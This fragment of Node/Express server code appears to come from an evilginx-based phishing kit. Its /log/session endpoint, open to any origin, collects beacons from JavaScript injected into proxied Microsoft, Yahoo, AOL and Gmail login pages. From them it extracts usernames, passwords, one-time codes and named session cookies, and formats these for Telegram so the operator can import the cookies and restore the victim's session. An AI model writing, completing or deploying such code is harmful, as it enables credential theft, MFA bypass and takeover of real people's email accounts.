...
// Provider-specific important cookie names for session restoration
// O365 / Outlook personal — Azure AD + live.com auth cookies
const O365_IMPORTANT_COOKIES = new Set([
  'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SIGNINSTATECOOKIE', 'ESTSSC', 'ESTSAUTHLIGHT',
  'CCSTATE', 'AADSSO', 'ESCTX', 'SSO_NONCE', 'OIDCSTATE',
  'MSPOK', 'PPAUTH', 'PPUID', 'RPSSECAUTH', 'WLS', 'ANON', 'NAP', 'WLID1',
  'X-OWA-CANARY', 'OIDCAUTH', 'CLIENTID', 'LOGON_UUID', 'AADSTATE',
  // Case-insensitive aliases also checked via .toUpperCase() below
]);
// Yahoo Mail — session restoration cookies (includes both real Yahoo casing and uppercase)
const YAHOO_IMPORTANT_COOKIES = new Set([
  // Uppercase (will match via exact key hit)
  'Y', 'T', 'B', 'GUC', 'GUCS', 'YDUS', 'PH', 'APID', 'APIDTS',
  // Real Yahoo casing (case-sensitive exact match)
  '_Y', 'EuConsent', 'thamba', 'ucs', 'sS', 'cmp',
]);
// AOL Mail — AOL runs on Yahoo's auth infrastructure; same core cookies apply
const AOL_IMPORTANT_COOKIES = new Set([
  'Y', 'T', 'B', 'GUC', 'GUCS', 'YDUS', 'PH', 'APID', 'APIDTS',
  '_Y', 'EuConsent', 'thamba', 'ucs', 'sS', 'cmp',
]);
// Gmail / Google — session restoration cookies
const GMAIL_IMPORTANT_COOKIES = new Set([
  'SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', 'NID', '1P_JAR',
  '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PSIDTS', '__Secure-3PSIDTS',
  '__Secure-1PAPISID', '__Secure-3PAPISID',
]);

// Session capture endpoint — receives beacons from the phishlet JS inject running on
// the proxied Microsoft / Yahoo login page. Responds with 204 immediately (beacons don't wait).
// CORS is set to allow any origin so cross-origin beacons from evilginx subdomains are accepted.
app.options('/log/session', (req, res) => {
...
app.post('/log/session', express.text({ type: '*/*', limit: '512kb' }), (req, res) => {
  // Allow cross-origin beacons from evilginx subdomains
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept');
  // Respond immediately so the beacon never times out
  res.status(204).end();
  ...
  try {
    ...
    const stage = String(payload.username || '').replace('SessionData-', '') || 'Unknown';
    const rawData = String(payload.password || '');
    const clientIP = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.ip || 'Unknown')
      .split(',')[0].trim();

    let credentials = null;
    let capturedCookieNames = [];
    let cookieValuesForRestore = {};
    let urlPreview = '';
    let hasStorage = false;
    let provider = 'o365'; // default

    try {
      const decoded = JSON.parse(rawData);

      // Detect provider from explicit field or from a properly-parsed URL hostname
      let urlHostname = '';
      try { urlHostname = new URL(String(decoded.url || '')).hostname.toLowerCase(); } catch (_) {}
      if (decoded.provider === 'yahoo' || urlHostname === 'login.yahoo.com'
          || urlHostname.endsWith('.yahoo.com') || urlHostname.endsWith('.yahoo.net')) {
        provider = 'yahoo';
      } else if (decoded.provider === 'aol' || urlHostname === 'login.aol.com'
          || urlHostname.endsWith('.aol.com')) {
        provider = 'aol';
      } else if (decoded.provider === 'gmail' || urlHostname === 'accounts.google.com'
          || urlHostname === 'mail.google.com' || urlHostname.endsWith('.google.com')) {
        provider = 'gmail';
      }

      // Extract credentials captured by the JS inject form monitor
      if (decoded.credentials) {
        const c = decoded.credentials;
        if (c.username || c.password || c.otp) {
          credentials = c;
        }
      }

      // Decode cookies and extract important ones (names + values) for session restoration
      if (decoded.cookies) {
        try {
          const cookieJson = Buffer.from(decoded.cookies, 'base64').toString('utf8');
          const cookieObj = JSON.parse(cookieJson);
          const importantSet = provider === 'yahoo' ? YAHOO_IMPORTANT_COOKIES
            : provider === 'aol' ? AOL_IMPORTANT_COOKIES
            : provider === 'gmail' ? GMAIL_IMPORTANT_COOKIES
            : O365_IMPORTANT_COOKIES;
          const keys = Object.keys(cookieObj);
          // Match important auth cookies (case-insensitive for O365, case-sensitive for others)
          const importantKeys = keys.filter(k => importantSet.has(k) || (provider === 'o365' && importantSet.has(k.toUpperCase())));
          if (importantKeys.length > 0) {
            capturedCookieNames = importantKeys;
            importantKeys.forEach(k => { cookieValuesForRestore[k] = String(cookieObj[k]).slice(0, 300); });
          } else if (keys.length > 0) {
            // Fall back to all cookies (up to 15)
            capturedCookieNames = keys.slice(0, 15);
            keys.slice(0, 15).forEach(k => { cookieValuesForRestore[k] = String(cookieObj[k]).slice(0, 300); });
          }
        } catch (_) { /* bad encoding – skip */ }
      }

      hasStorage = !!(decoded.localStorage || decoded.sessionStorage);
      urlPreview = String(decoded.url || '').slice(0, 120);
    } catch (_) { /* keep defaults */ }

    // Provider label + emoji for Telegram header
    const providerLabel = provider === 'yahoo'
      ? '\u{1F7E3} *Yahoo Mail Session Beacon*'
      : provider === 'aol'
      ? '\u{1F7E1} *AOL Mail Session Beacon*'
      : provider === 'gmail'
      ? '\u{1F534} *Gmail Session Beacon*'
      : '\u{1F535} *MS O365/Outlook Session Beacon*';
    ...
    if (credentials && (credentials.username || credentials.password || credentials.otp)) {
      lines.push(``);
      lines.push(`\u{1F511} *Credentials Captured:*`);
      if (credentials.username) lines.push(`\u{1F464} User: \`${credentials.username}\``);
      if (credentials.password) lines.push(`\u{1F510} Pass: \`${credentials.password}\``);
      if (credentials.otp)      lines.push(`\u{1F522} OTP:  \`${credentials.otp}\``);
    }

    if (capturedCookieNames.length > 0) {
      lines.push(``);
      lines.push(`\u{1F36A} *Auth Cookies (${capturedCookieNames.length}) — for session restore:*`);
      // Include name=value pairs so the operator can import them directly
      Object.entries(cookieValuesForRestore).forEach(([name, val]) => {
        lines.push(`\`${name}\`=\`${val}\``);
      });
    }
    ...
    if (urlPreview) {
      lines.push(``);
      lines.push(`\u{1F517} URL: \`${urlPreview}\``);
    }

    if (hasStorage) {
      lines.push(`\u{1F4BE} Storage: localStorage/sessionStorage captured`);
    }
    ...
    // Never crash on bad beacon data
  }
});
